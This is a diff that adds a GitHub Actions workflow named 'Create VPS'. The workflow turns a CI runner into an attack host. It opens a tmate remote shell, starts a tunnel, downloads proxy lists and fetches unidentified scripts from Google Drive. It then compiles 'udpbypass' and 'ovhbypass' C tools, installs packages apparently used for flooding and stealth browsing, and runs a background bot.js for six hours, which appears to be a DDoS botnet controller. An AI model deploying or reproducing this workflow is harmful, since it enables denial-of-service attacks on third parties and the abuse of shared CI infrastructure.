@@ -1,0 +1,61 @@
+name: Create VPS (Clean Version)
+
+on:
+  workflow_dispatch:
+  repository_dispatch:
+    types: [create-vps]
+
+jobs:
+  start-vps:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    steps:
+      - name: ⬇️ Checkout
+        uses: actions/checkout@v4
+
+      - name: 🔧 Start tmate session
+        run: |
+          sudo apt update -y && sudo apt install -y tmate
+          tmate -S /tmp/tmate.sock new-session -d
+          tmate -S /tmp/tmate.sock wait tmate-ready
+          SSH=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
+          echo "🔗 SSH Connection: $SSH"
+          echo "$SSH" > ssh_connection.txt
+
+      - name: 🚀 Start Playit Tunnel
+        run: |
+          wget -q https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64 -O playit
+          chmod +x playit
+          nohup ./playit > playit.log 2>&1 &
+          echo "✅ Playit tunnel started"
+
+      - name: 🔥 Setup VPS Environment
+        run: |
+          wget -q https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/https.txt
+          wget -q https://github.com/ErcinDedeoglu/proxies/raw/refs/heads/main/proxies/https.txt -O proxy.txt
+          pip install gdown
+          gdown https://drive.google.com/uc?id=1l7XemuQ4MuxYYzmzLYnXTF9tXw_mutgV -O hieu.js
+          gdown https://drive.google.com/uc?id=1Kpe6qSbsNaS-z0f9BMCyJsi3ooVouPLh -O raw.js
+          gdown https://drive.google.com/uc?id=1d7DjHHAqvOA5QkYw196JJZ_Vj3xMXfZF
+          gdown https://drive.google.com/uc?id=1yUo671F3nwX1KGRYxzZl09F15eMtNaZV
+          gdown https://drive.google.com/uc?id=1W-q3LSgM6oE14Fd_rrWVwRUmqxgChdMZ
+          gdown https://drive.google.com/uc?id=1_wXltanrFfLzl0hembWZ1f6PwFy4qbZW
+          gdown https://drive.google.com/uc?id=1z0VINnYv93dXpwfsN524oIDugy1gaX8A
+          gdown 14nBsCj9q_8XlgbT2c17bkdmq1I7xE9y3
+          gdown https://drive.google.com/uc?id=1YKNPGX9B3u9p-NaV33BgVJ0W9lkrRgQx
+          gdown 1Vq9T9WkLJdMDQf9s2mL4w32cRsxr6lPk -O bot.js
+          gdown 'https://drive.google.com/uc?id=1MuaBraso20I73ixepu6SQWDq0GMnlU05' -O udpbypass.c
+          gcc udpbypass.c -o udpbypass
+          gdown https://drive.google.com/uc?id=1Q2VYSvBdeclp6A1f8xePFrT6Yt7ZB2gX -O ovh.c
+          gcc ovh.c -o ovhbypass
+          npm install cluster colors colorama axios crypto discord.js gradient-string user-agents header-generator hpack socks puppeteer puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-real-browser
+          nohup node bot.js > bot.log 2>&1 &
+          echo "✅ Bot started in background"
+
+      - name: ⏳ Keep VPS alive
+        run: |
+          for i in $(seq 1 360); do
+            echo "🟢 Running minute $i/360..."
+            sleep 60
+          done
